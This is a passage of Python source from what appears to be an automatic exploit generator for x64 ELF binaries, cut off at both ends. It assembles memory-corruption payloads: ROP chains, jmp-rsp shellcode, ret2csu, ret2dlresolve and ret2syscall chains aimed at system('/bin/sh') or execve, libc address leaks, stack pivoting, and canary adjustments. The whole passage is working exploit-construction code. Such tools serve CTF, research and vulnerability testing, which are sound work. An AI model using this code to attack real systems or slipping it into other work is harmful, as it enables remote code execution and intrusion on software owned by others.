        :param singlepayload: the singlepayload generate by the functions
        :param haverecvlibc: the single_payload have or not have recv information
        :param issystemroppayload: if this is a system rop payload, we need to choose a
        place don't be so close to .bss
        :return: True when success, False when not
        """
        if self.statelog.functionname != "general_check":
            log.Exception("must used in general check vulnerability")
            return False
        if single_payload.CheckStaticPayload():
            self.load_general_single_payload_content = single_payload.GetPayload()

        bss_address = self.GetBssAddressWrite(for_rop=True)
        bss_address_element = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int64"
        )
        length = single_payload.GetContentLength()
        need_send_payload = single_payload
        final_payload, avoidchars, needline = self.InputROPPayloadGenertate(
            address_element=bss_address_element,
            length=length,
            need_pop=True
        )
        if final_payload is None:
            log.Exception("cannot generate")
            return False
        rbp_gadget = self.gadgetservice.FindPopGadget(register="rbp")
        bss_address_minus8_element = PayloadElement(
            datavalue=bss_address - 0x8, adjustinfo="elf_base",
            datatype="int64")
        final_payload.extend(self.RegisterGadgetGenerate(
            gadget=rbp_gadget, register="rbp",
            register_value=bss_address_minus8_element
        ))
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int64"
        ))
        # self.AvoidUbuntuVersionError(payload=final_payload, adjust=True)
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        input_payload = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=needline,
            avoidchars=avoidchars
        )
        state = self.statelog.state
        state_bak = state.copy()
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=input_payload, direction="backward",
            privilege="rw", need_check_align=True)
        if not can_load:
            self.statelog.state = state_bak
            return False
        address_element = PayloadElement(
            datavalue=address - 8, adjustinfo="elf_base", datatype="int64"
        )
        final_payload = []
        final_payload.append(address_element)
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int64"
        ))
        self.OptimizeForROP(payload=final_payload, adjustcanary=True,
                            have_ebp=True)
        singlepayload = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0 + self.canary_offset_rbp, needline=0,
            avoidchars=self.avoidchars
        )

        state = self.statelog.state
        copystate = state.copy()
        # state.add_constraints(state.regs.eip == ret_gadget.address)
        address = state.solver.eval(state.regs.rsp)
        address -= 0x10 # this is for ret instruction, and also the rbp
        can_load = self.TryLoadPayloadForAddress(
            address=address, single_payload=singlepayload)
        if state.satisfiable() and can_load:
            if haverecvlibc:
                self.GenerateFinalPayload(singlepayload=None)
            else:
                self.GenerateFinalPayloadNoRecv(singlepayload=None)
            self.statelog.need_send = True
            self.statelog.need_send_payload = need_send_payload
            log.success("successfully generate a payload in LoadInputPayloadForGeneralCheck")
            return True
        else:
            log.info("cannot successfully generate a payload in LoadInputPayloadForGeneralCheck")
            self.statelog.state = copystate
            return False

    def JmpRspPayloadGenerate(self):
        """
        use jmp to directly jump to shellcode in the stack
        :return: True when success generated, False when failed
        """
        if self.NX:
            return False
        jmp_rsp_gadget = self.gadgetservice.FindJmpGadget(register="rsp")
        if jmp_rsp_gadget is None:
            return False
        final_payload = []
        final_payload.append(PayloadElement(
            datavalue=jmp_rsp_gadget.address, adjustinfo="elf_base", datatype="int64"
        ))
        final_payload.append(PayloadElement(
            datavalue=self.GenerateShellcode(), adjustinfo=None, datatype="bytes"
        ))
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_rbp, needline=False,
            avoidchars=b""
        )
        if singlepayload.BeforeAdjustCheck():
            # self.payloadlist.AppendPayload(single_payload)
            self.HandleFinalPayload(singlepayload=singlepayload,
                                    singlepayload_load=singlepayload_load,
                                    singlepayload_canary=singlepayload_canary,
                                    singlepayload_canary_load=singlepayload_canary_load,
                                    haverecvlibc=False,
                                    issystemroppayload=False
                                    )
            log.info("successfully use jmp esp method generate")
            return True
        log.info("cannot successfully generate jmp rsp payload in JmpRspPayloadGenerate")
        return False

    def InputROPPayloadGenertate(self, address_element=PayloadElement(),
            length=0, return_element=PayloadElement(), need_pop=False):
        """
        use input functions to generate rop payload
        for example, read(0, address, length)
        :param address_element: the address you want to input, must in Payload element format
        :param length: the length of the input
        :param return_element: the return content element,
        if need_pop is True: this parameter has no meaning
        :param need_pop: if need_pop, should pop the parameter in the stack first
        :return: payloadlist, avoidchars, needline
        """
        if self.function_helper.CheckHaveFunction(func_name="read") and not self.static:
            final_payload = []
            rdi_value = PayloadElement(datavalue=0, adjustinfo=None, datatype="int64")
            rsi_value = address_element
            rdx_value = PayloadElement(
                datavalue=length, adjustinfo=None, datatype="int64")
            call_address_value = PayloadElement(
                datavalue=self.elf.got["read"],
                adjustinfo="elf_base", datatype="int64"
            )
            csupayload = self.ret2csuinitpayload.GetCsuPayload(
                rdi=rdi_value, rsi=rsi_value, rdx=rdx_value,
                call_address=call_address_value, fullpayload=True
            )
            if csupayload is not None:
                # rdi value is always zero, must success
                final_payload.extend(csupayload)
            else:
                log.Exception("csu payload generete failed, please check it")
                return None, b"", False
            if not need_pop:
                final_payload.append(return_element)
            # self.AvoidUbuntuVersionError(payload=final_payload)
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            single_payload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            avoidchars = b""
            needline = False
            if not single_payload.BeforeAdjustCheck():
                log.info("read funtion input rop generate failed")
            else:
                return final_payload, avoidchars, needline
        if self.function_helper.CheckHaveFunction(func_name="gets"):
            function_address = self.function_helper.GetFunctionAddress(func_name="gets")
            rdi_gadget = self.gadgetservice.FindPopGadget(register="rdi")
            rdi_value = address_element
            gets_element = PayloadElement(
                datavalue=function_address,
                adjustinfo="elf_base", datatype="int64"
            )
            final_payload = []
            final_payload.extend(self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi",
                register_value=rdi_value
            ))
            final_payload.append(gets_element)
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            if not need_pop:
                final_payload.append(return_element)
            avoidchars = b"\n"
            needline = True
            single_payload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            if not single_payload.BeforeAdjustCheck():
                log.info("gets funtion input rop generate failed")
            else:
                return final_payload, avoidchars, needline
        if self.function_helper.CheckHaveFunction(func_name="scanf"):
            function_address = self.function_helper.GetFunctionAddress(func_name="scanf")
            final_payload = []
            rdi_gadget = self.gadgetservice.FindPopGadget(register="rdi")
            rsi_gadget = self.gadgetservice.FindPopGadget(register="rsi")
            try:
                percent_s_element = PayloadElement(
                    datavalue=next(self.elf.search(b"%s\x00")),
                    adjustinfo="elf_base", datatype="int64"
                )
            except:
                log.Exception("cannot find %s format, cannot generate")
                return None, b"", False
            rdi_value = percent_s_element
            rsi_value = address_element
            final_payload.extend(self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi", register_value=rdi_value))
            final_payload.extend(self.RegisterGadgetGenerate(
                gadget=rsi_gadget, register="rsi", register_value=rsi_value))
            final_payload.append(PayloadElement(
                datavalue=function_address, adjustinfo="elf_base", datatype="int64"
            ))
            avoidchars = b"\n\x20"
            needline = True
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            single_payload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            if not single_payload.BeforeAdjustCheck():
                log.info("scanf funtion input rop generate failed")
            else:
                return final_payload, avoidchars, needline
        log.Exception("cannot successfully generate input payload, please check it")
        return None, b"", False

    def CheckPayloadLength(self, singlepayload=SinglePayload()):
        """
        check the payload's length, if length is not enough, return False
        if enough, return True
        :param singlepayload: the payload we need to check
        :return: True when enough, False when not
        """
        if singlepayload is None:
            log.Exception("single payload generate failed in CheckPayloadLength, please check it")
            return False
        if singlepayload.GetContentLength() == 0:
            log.Exception("single payload generate failed in CheckPayloadLength, please check it")
            return False
        payloadlength = singlepayload.GetContentLength()
        if self.needlength != 0:
            if self.needlength >= payloadlength + singlepayload.prefixlength:
                return True
            else:
                return False
        else:
            return True

    def GenerateLeakPayload(self, leak_address=0, adjustinfo="code_base"):
        """
        generally used to gernerate a leak address payload
        :param leak_address: the address want to leak
        :return: return payload or None when failed
        """
        final_payload = []
        rdi_gadget = self.gadgetservice.FindPopGadget(register="rdi")
        if self.function_helper.CheckHaveFunction(func_name="puts"):
            function_address = self.function_helper.GetFunctionAddress(func_name="puts", rebase_addr=True)
            rdi_value = PayloadElement(
                datavalue=leak_address, adjustinfo=adjustinfo, datatype="int64"
            )
            final_payload.extend(self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi", register_value=rdi_value))
            final_payload.append(PayloadElement(
                datavalue=function_address, adjustinfo="elf_base", datatype="int64"
            ))
            return final_payload
        if self.function_helper.CheckHaveFunction(func_name="printf"):
            function_address = self.function_helper.GetFunctionAddress(func_name="printf")
            rdi_value = PayloadElement(
                datavalue=leak_address, adjustinfo=adjustinfo, datatype="int64"
            )
            final_payload.extend(self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi", register_value=rdi_value))
            final_payload.append(PayloadElement(
                datavalue=function_address, adjustinfo="elf_base", datatype="int64"
            ))
            return final_payload
        if self.function_helper.CheckHaveFunction(func_name="write") and not self.static:
            # function_address = self.function_helper.GetFunctionAddress(func_name="printf")
            rdi_value = PayloadElement(
                datavalue=1, adjustinfo=None, datatype="int64")
            rsi_value = PayloadElement(
                datavalue=leak_address, adjustinfo=adjustinfo, datatype="int64"
            )
            rdx_value = PayloadElement(
                datavalue=0x8, adjustinfo=None, datatype="int64")
            call_address_value = PayloadElement(
                datavalue=self.elf.got["write"], adjustinfo="elf_base", datatype="int64"
            )
            csupayload = self.ret2csuinitpayload.GetCsuPayload(
                rdi=rdi_value, rsi=rsi_value, rdx=rdx_value,
                call_address=call_address_value, fullpayload=True
            )
            if csupayload is not None:
                # rdi value is always 0, must success
                final_payload.extend(csupayload)
                return final_payload

    def GenerateFinalPayloadNoRecv(self, singlepayload=None,
                                   need_send_payload=SinglePayload(),
                                   need_send=False):
        """
        generate the final payload before return
        because we need to judge which payload to add the recv info
        and we need to judge the payload of strcpy
        :param singlepayload: the original payload generated
        :param need_send_payload: the payload for send
        :param need_send: if we have some payload need send in the final, set it True,
        therwise set it false
        :return: None
        """
        if self.statelog.functionname != "general_check" and singlepayload is None:
            log.Exception("singel payload is None, please check it")
            return False
        scanfinfo = self.statelog.scanfinfo
        strcpyinfo = self.statelog.strcpyinfo
        func_list = ["strcpy", "strncpy"]
        if strcpyinfo is not None:
            suffix_begin_index = strcpyinfo.suffix_payload_begin_index
            suffix_end_index = strcpyinfo.suffix_payload_end_index
            suffix_length = suffix_end_index - suffix_begin_index
        if self.statelog.functionname == "scanf" and \
                scanfinfo.overflow_index + 1 < len(scanfinfo.formats):
            self.payloadlist.AppendPayload(singlepayload)
            singlepayload_scanf = self.ParseScanfSuffixPayload()
            self.payloadlist.AppendPayload(singlepayload_scanf)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)
        elif self.statelog.functionname in func_list and suffix_length != 0:
            self.payloadlist.AppendPayload(singlepayload)
            all_input = self.statelog.state.posix.dumps(sys.stdin.fileno())
            payload = [PayloadElement(
                datavalue=all_input[suffix_begin_index:suffix_end_index], adjustinfo=None, datatype="bytes")]
            singlepayload_strcpy = SinglePayload(
                content=payload, length=suffix_length,
                prefixlength=0
            )
            output_length = strcpyinfo.output_end_index - strcpyinfo.output_begin_index
            if output_length != 0:
                singlepayload_strcpy.AddRecvInfo(
                    type="string", recv_index=[strcpyinfo.output_begin_index, strcpyinfo.output_end_index],
                    func="bytes", adjustoffset=None
                )
            self.payloadlist.AppendPayload(singlepayload_strcpy)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)
        elif self.statelog.functionname == "general_check":
            pass
        else:
            if self.statelog.functionname in func_list:
                output_length = strcpyinfo.output_end_index - strcpyinfo.output_begin_index
                if output_length != 0:
                    all_output = self.statelog.state.posix.dumps(sys.stdout.fileno())
                    output_info = all_output[strcpyinfo.output_begin_index:strcpyinfo.output_end_index]
                    singlepayload.AddRecvInfo(
                        type="string", recv_index=[strcpyinfo.output_begin_index, output_info],
                        func="bytes", adjustoffset=None
                    )
            self.payloadlist.AppendPayload(singlepayload)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)

    def GenerateFinalPayload(self, singlepayload=None,
                             need_send_payload=SinglePayload(),
                             need_send=False):
        """
        generate the final payload before return
        because we need to judge which payload to add the recv info
        :param singlepayload: the original payload generated
        :param need_send_payload: the payload for send
        :param need_send: if we have some payload need send in the final, set it True,
        otherwise set it false
        :return: None
        """
        if self.statelog.functionname != "general_check" and singlepayload is None:
            log.Exception("singel payload is None, please check it")
            return False
        scanfinfo = self.statelog.scanfinfo
        strcpyinfo = self.statelog.strcpyinfo
        func_list = ["strcpy", "strncpy"]
        if strcpyinfo is not None:
            suffix_begin_index = strcpyinfo.suffix_payload_begin_index
            suffix_end_index = strcpyinfo.suffix_payload_end_index
            suffix_length = suffix_end_index - suffix_begin_index
        if self.statelog.functionname == "scanf" and \
                scanfinfo.overflow_index + 1 < len(scanfinfo.formats):
            self.payloadlist.AppendPayload(singlepayload)
            singlepayload_scanf = self.ParseScanfSuffixPayload()
            if need_send:
                need_send_payload.AddRecvInfo(
                type="libc_base", recv_index=[0, 6], func="u64",
                adjustoffset=-self.libc.symbols["__libc_start_main"]
            )
            else:
                singlepayload_scanf.AddRecvInfo(
                    type="libc_base", recv_index=[0, 6], func="u64",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            self.payloadlist.AppendPayload(singlepayload_scanf)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)
        elif self.statelog.functionname in func_list and suffix_length != 0:
            self.payloadlist.AppendPayload(singlepayload)
            all_input = self.statelog.state.posix.dumps(sys.stdin.fileno())
            payload = [PayloadElement(
                datavalue=all_input[suffix_begin_index:suffix_end_index], adjustinfo=None, datatype="bytes")]
            singlepayload_strcpy = SinglePayload(
                content=payload, length=suffix_length,
                prefixlength=0
            )
            output_length = strcpyinfo.output_end_index - strcpyinfo.output_begin_index
            if output_length != 0:
                singlepayload_strcpy.AddRecvInfo(
                    type="string", recv_index=[strcpyinfo.output_begin_index, strcpyinfo.output_end_index],
                    func="bytes", adjustoffset=None
                )
            if need_send:
                need_send_payload.AddRecvInfo(
                    type="libc_base", recv_index=[0, 6], func="u64",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            else:
                singlepayload_strcpy.AddRecvInfo(
                    type="libc_base", recv_index=[0, 6], func="u64",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            self.payloadlist.AppendPayload(singlepayload_strcpy)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)
        elif self.statelog.functionname == "general_check":
            self.statelog.Changeneedrecvlibc()
        else:
            if self.statelog.functionname in func_list:
                output_length = strcpyinfo.output_end_index - strcpyinfo.output_begin_index
                if output_length != 0:
                    all_output = self.statelog.state.posix.dumps(sys.stdout.fileno())
                    output_info = all_output[strcpyinfo.output_begin_index:strcpyinfo.output_end_index]
                    singlepayload.AddRecvInfo(
                        type="string", recv_index=[strcpyinfo.output_begin_index, output_info],
                        func="bytes", adjustoffset=None
                    )
            if need_send:
                need_send_payload.AddRecvInfo(
                    type="libc_base", recv_index=[0, 6], func="u64",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            else:
                singlepayload.AddRecvInfo(
                    type="libc_base", recv_index=[0, 6], func="u64",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            self.payloadlist.AppendPayload(singlepayload)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)

    def HandleFinalPayload(self, singlepayload=SinglePayload(),
                           singlepayload_load=SinglePayload(),
                           singlepayload_canary=SinglePayload(),
                           singlepayload_canary_load=SinglePayload(),
                           haverecvlibc=False,
                           issystemroppayload=False):
        """
        after generate a single payload, we need to handle this payload generate
        use different strategy for different situation
        :param singlepayload: the payload generated
        :param singlepayload_load: the payload for load
        :param singlepayload_canary: the single payload generated have canary
        :param singlepayload_canary_load: the single payload generated not have canary
        :param haverecvlibc: if we need to recv libc info, set it True
        :return: True when success, False when not
        """
        if self.statelog.functionname == "general_check":
            # load payload to some place and return
            if self.LoadPayloadForGeneralCheck(
                    single_payload=singlepayload,
                    singlepayload_canary=singlepayload_canary,
                    haverecvlibc=haverecvlibc,
                    issystemroppayload=issystemroppayload
            ):
                return True
            # load input payload first for the rop payload
            # thus we only need no canary payload
            if self.LoadInputPayloadForGeneralCheck(
                    single_payload=singlepayload,
                    haverecvlibc=haverecvlibc,
                    issystemroppayload=issystemroppayload
            ):
                return True
            log.Exception("cannot generate payload for this general vulnerability")
            return False
        else:
            if self.CheckPayloadLength(singlepayload_canary):
                if haverecvlibc:
                    self.GenerateFinalPayload(singlepayload=singlepayload_canary)
                else:
                    self.GenerateFinalPayloadNoRecv(singlepayload=singlepayload_canary)
                return True
            # load payload to the return address and return, or use stack pivoting
            if self.LoadPayloadAndReturn(
                    single_payload=singlepayload_load,
                    single_payload_canary=singlepayload_canary_load,
                    have_recv=haverecvlibc,
                    issystemroppayload=issystemroppayload
            ):
                return True
            # sometimes the payload is too long and we can use this method
            if self.LoadInputPayloadAndReturn(
                    single_payload=singlepayload_load,
                    have_recv=haverecvlibc,
                    issystemroppayload=issystemroppayload
            ):
                return True
            log.Exception("cannot handle payload generate in HandleFinalPayload")
            return False

    def Generate_dlruntime_resolve_Payload(self):
        """
        generate the payload with ret2_dlruntime_resolve method
        :return: True when success, False when not
        """
        pwn.context.binary = self.elf
        # rop = pwn.ROP(pwn.context.binary)
        dlresolve = pwn.Ret2dlresolvePayload(self.elf, symbol="system", args=["/bin/sh"])
        if dlresolve.unreliable:
            log.Exception("dlresolve data is unreliable in Generate_dlruntime_resolve_Payload, please check it")
            return False
        address = dlresolve.data_addr
        dlresolve_addr_element = PayloadElement(
            datavalue=address, adjustinfo="elf_base", datatype="int64"
        )
        dlresolve_data = dlresolve.payload
        final_payload, next_avoidchars, next_needline = self.InputROPPayloadGenertate(
            address_element=dlresolve_addr_element,
            length=len(dlresolve_data),
            need_pop=True
        )
        if final_payload is None:
            return False
        binsh_addr = dlresolve.data_addr + dlresolve.payload.index(b"/bin/sh")
        binsh_element = PayloadElement(
            datavalue=binsh_addr, adjustinfo="elf_base", datatype="int64"
        )
        rdi_gadget = self.gadgetservice.FindPopGadget(register="rdi")
        final_payload.extend(self.RegisterGadgetGenerate(
            gadget=rdi_gadget, register="rdi", register_value=binsh_element))
        plt0_addr = self.statelog.project.loader.main_object.sections_map[".plt"].min_addr
        plt0_element = PayloadElement(
            datavalue=plt0_addr, adjustinfo="elf_base", datatype="int64"
        )
        final_payload.append(plt0_element)
        reloc_index_element = PayloadElement(
            datavalue=dlresolve.reloc_index, adjustinfo="None", datatype="int64"
        )
        final_payload.append(reloc_index_element)
        self.AvoidUbuntuVersionError(final_payload)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_rbp, needline=False,
            avoidchars=b""
        )
        if not self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=False  # input rop for shellcode
        ):
            log.info("cannot successfully generate payload in Generate_dlruntime_resolve_Payload")
            return False
        # self.payloadlist.AppendPayload(singlepayload)
        final_payload2 = [PayloadElement(
            datavalue=dlresolve_data, adjustinfo=None, datatype="bytes")]
        self.payloadlist.AppendPayload(SinglePayload(
            content=final_payload2, length=len(dlresolve_data),
            prefixlength=0, avoidchars=next_avoidchars,
            needline=next_needline
        ))
        return True

    def BackdoorPayloadGenerate(self):
        """
        find a backdoor and return
        :return: True when succeed, False when not
        """
        backdoorfind = BackDoorFinder(
            binary_path=self.binarypath, function_helper=self.function_helper)
        backdoors = backdoorfind.AnalyseBackdoorMain()
        if backdoors is None:
            return False
        if len(backdoors) == 0:
            return False
        log.success("find backdoor in this binary, just return it")
        backdoorentry = backdoors[0]["backdoorentry"]
        backdoorentry_element = PayloadElement(
            datavalue=backdoorentry, adjustinfo="elf_base", datatype="int64"
        )
        final_payload = []
        final_payload.append(backdoorentry_element)
        self.AvoidUbuntuVersionError(payload=final_payload)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_rbp, needline=False,
            avoidchars=b""
        )
        if self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=True  # system("/bin/sh") payload
        ):
            return True
        log.info("cannot generate payload in ROPPayloadStaticNXEnable_X64")
        return True

    def GeneratePayload_X64(self):
        """
        the is the main function for generating payload for x64(amd64)
        :return: self.payloadlist
        """
        # self.ParseStatelogPath()
        if self.BackdoorPayloadGenerate():
            return True
        if self.static:
            # if it is a static bianry, maybe the canary check will be false
            if not self.NX:
                # no NX, no PIE
                # just generate shellcode and jmp esp first
                return self.ROPPayloadStaticNXDisable_X64()
            else:
                # NX enabled, or we cannot find the jmp rsp gadget
                # try to use a ROPchain to solve this problem
                # for static binary, use ret2syscall to solve this problem
                return self.ROPPayloadStaticNXEnable_X64()
        else:
            if not self.NX:
                # just generate shellcode and jmp esp first
                return self.ROPPayloadDynamicNXDisable_X64()
            else:
                # no NX, must use ROP to solve this problem
                return self.ROPPayloadDynamicNXEnable_X64()

    def ROPPayloadStaticNXDisable_X64(self):
        """
        if this binary has no nx protection, it's in this branch for x86(i386)
        1. check whether there is a PIE protection
        2. check whether there is a canary protection
        and set the final payloadlist into self.payloadlist
        :return: True when successfully generated, False when failed
        """
        method1 = self.JmpRspPayloadGenerate()
        if method1:
            return True
        method2 = self.LoadShellcodeAndReturn()
        if method2:
            return True
        method3 = self.ROPPayloadStaticNXEnable_X64()
        if method3:
            return True
        log.info("cannot generate payload in ROPPayloadStaticNXDisable_X64")
        return False

    def ROPPayloadStaticNXEnable_X64(self):
        """
        for NX enable, use ROP chain to solve this payload
        :return: the ROP payload
        """
        method1 = self.LoadShellcodeAndReturn()
        if method1:
            return True
        if "system" in self.elf.symbols.keys():
            log.info("find a system symbol in this binary, just use this")
            havesystem = True
            system = self.elf.symbols["system"]
            system_element = PayloadElement(
                datavalue=system, adjustinfo="elf_base", datatype="int64"
            )
        else:
            log.info("no system in this binary, try to use ret2syscall")
            havesystem = False
            system = 0
            system_element = PayloadElement()
        try:
            log.info("find /bin/sh string in this binary")
            binsh = next(self.elf.search(b"/bin/sh"))
            binsh_element = PayloadElement(
                datavalue=binsh, adjustinfo="elf_base", datatype="int64")
            havebinsh = True
        except:
            log.info("cannot find /bin/sh string in this binary")
            binsh = 0
            binsh_element = PayloadElement()
            havebinsh = False
        # final_payload = b""
        if havesystem and havebinsh:
            log.info("have system and binsh, find the rdi and ROP it")
            final_payload = []
            rdi_gadget = self.gadgetservice.FindPopGadget(register="rdi")
            final_payload.extend(self.RegisterGadgetGenerate(
                gadget=rdi_gadget, register="rdi", register_value=binsh_element))
            final_payload.append(system_element)
            self.AvoidUbuntuVersionError(payload=final_payload)
            final_payload_canary = final_payload[:]
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_load = SinglePayload(
                content=final_payload, length=0,
                prefixlength=0, needline=False,
                avoidchars=b""
            )
            singlepayload_canary = SinglePayload(
                content=final_payload_canary, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_canary_load = SinglePayload(
                content=final_payload_canary, length=0,
                prefixlength=self.canary_offset_rbp, needline=False,
                avoidchars=b""
            )
            if self.HandleFinalPayload(
                    singlepayload=singlepayload,
                    singlepayload_load=singlepayload_load,
                    singlepayload_canary=singlepayload_canary,
                    singlepayload_canary_load=singlepayload_canary_load,
                    haverecvlibc=False,
                    issystemroppayload=True  # system("/bin/sh") payload
            ):
                return True
            log.info("cannot generate payload in ROPPayloadStaticNXEnable_X64")
            return False
        if not havesystem and havebinsh:
            log.info("have binsh but no system")
            log.info("for static binary, use the ret2syscall method to solve this")
            final_payload = []
            rdi_value = binsh_element
            rsi_value = PayloadElement(datavalue=0, adjustinfo=None, datatype="int64")
            rdx_value = PayloadElement(datavalue=0, adjustinfo=None, datatype="int64")
            syscall_tab_value = PayloadElement(
                datavalue=pwn.constants.linux.amd64.SYS_execve,
                adjustinfo=None, datatype="int64"
            )
            final_payload.extend(self.SyscallROPPayloadGenerate_X64(
                rdi=rdi_value, rsi=rsi_value, rdx=rdx_value,
                syscall_tab=syscall_tab_value))
            self.AvoidUbuntuVersionError(final_payload)
            final_payload_canary = final_payload[:]
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_load = SinglePayload(
                content=final_payload, length=0,
                prefixlength=0, needline=False,
                avoidchars=b""
            )
            singlepayload_canary = SinglePayload(
                content=final_payload_canary, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_rbp, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_canary_load = SinglePayload(
                content=final_payload_canary, length=0,
                prefixlength=self.canary_offset_rbp, needline=False,
                avoidchars=b""
            )
            if self.HandleFinalPayload(
                    singlepayload=singlepayload,
                    singlepayload_load=singlepayload_load,
                    singlepayload_canary=singlepayload_canary,
                    singlepayload_canary_load=singlepayload_canary_load,
                    haverecvlibc=False,
                    issystemroppayload=False  # syscall is not system
            ):
                return True
            log.info("cannot generate payload in ROPPayloadStaticNXEnable_X64")
            return False
        if not havebinsh:
            # if no binsh in this binary, try to use read syscall to create a binsh
            log.info("no system and no binsh")
            log.info("for static binary, use the ret2syscall method to solve this")
            # finish the read syscall payload
            binsh_addr = self.elf.bss()
            binsh_addr_element = PayloadElement(
                datavalue=binsh_addr, adjustinfo="elf_base",
                datatype="int64"
            )
            binsh_string = b"/bin/sh\x00"
            final_payload = []
            rdi_value = PayloadElement(
                datavalue=0, adjustinfo=None, datatype="int64"
            )
            rsi_value = binsh_addr_element
            rdx_value = PayloadElement(
                datavalue=len(binsh_string), adjustinfo=None, datatype="int64"
            )
            syscall_tab_value = PayloadElement(
                datavalue=pwn.constants.linux.amd64.SYS_read,
                adjustinfo=None, datatype="int64"
            )
            final_payload.extend(self.SyscallROPPayloadGenerate_X64(
                rdi=rdi_value, rsi=rsi_value, rdx=rdx_value,
                syscall_tab=syscall_tab_value
            ))
            self.AvoidUbuntuVersionError(final_payload)
            # finish the execve syscall
            rdi_value = binsh_addr_element
            rsi_value = PayloadElement(
                datavalue=0, adjustinfo=None, datatype="int64")
            rdx_value = PayloadElement(
                datavalue=0, adjustinfo=None, datatype="int64")
            syscall_tab_value = PayloadElement(
                datavalue=pwn.constants.linux.amd64.SYS_execve,
                adjustinfo=None, datatype="int64"
            )
            final_payload.extend(self.SyscallROPPayloadGenerate_X64(
                rdi=rdi_value, rsi=rsi_value, rdx=rdx_value,
                syscall_tab=syscall_tab_value
            ))
            final_payload_canary = final_payload[:]
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
